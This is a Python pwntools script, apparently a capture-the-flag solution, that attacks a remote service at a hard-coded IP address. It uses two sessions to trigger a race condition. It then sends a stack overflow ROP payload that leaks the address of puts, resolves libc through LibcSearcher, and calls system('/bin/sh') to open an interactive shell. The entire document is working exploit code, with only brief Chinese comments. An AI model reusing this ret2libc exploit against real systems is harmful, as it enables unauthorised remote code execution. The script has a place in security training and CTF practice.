from pwn import *
from LibcSearcher import *

context.log_level = 'DEBUG'

# io1 = process('../file/962aee45bb2a48cd8c905e81122829b6')
# io2 = process('../file/962aee45bb2a48cd8c905e81122829b6')
io1 = remote('61.147.171.105', '55468')
io2 = remote('61.147.171.105', '55468')

elf = ELF('../file/962aee45bb2a48cd8c905e81122829b6')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vul_func = elf.sym['vul_func']
  
def login(io, name):  
    io.sendlineafter(b"login:", name)  
  
def attack(io):  
    io.sendlineafter(b"choice>> ", b"1")  
  
def use_hide(io, choice):  
    io.sendlineafter(b"(1:yes/0:no):", str(choice).encode())  
  
def change_skill(io, choice):  
    io.sendlineafter(b"choice>> ", b"3")  
    io.sendlineafter(b"choice>> ", str(choice).encode())  
  
def god_attack(io1, io2):  
    change_skill(io1, 3)  
    attack(io1)  
    change_skill(io2, 1)  
    use_hide(io1, 1)  

def pwn(io1, io2):  
    login(io1, b"test\n")  
    login(io2, b"test\n")  
    while True:  
        god_attack(io1, io2)  
        data = io1.recvuntil(b"\n")  
        if b"you win" in data:  
            data = io1.recvuntil(b"\n")  
            if b"remember you forever!" in data:  
                break

    #泄露puts的地址  
    payload = b'a'*0x4C + p32(puts_plt) + p32(vul_func) + p32(puts_got)  
    io1.sendlineafter(b'name:', payload)  
    io1.recvuntil(b'\n')  
    puts_addr = u32(io1.recv(4))  

    #查询数据库，得到libc的信息  
    libc = LibcSearcher('puts', puts_addr)

    #获得libc基址  
    libc_base = puts_addr - libc.dump('puts')  
    system_addr = libc_base + libc.dump('system')  
    binsh_addr = libc_base + libc.dump('str_bin_sh')  

    #getshell  
    payload = b'a'*0x4C + p32(system_addr) + p32(0) + p32(binsh_addr)  
    io1.sendlineafter('name:',payload)  

pwn(io1, io2)  
io1.interactive()  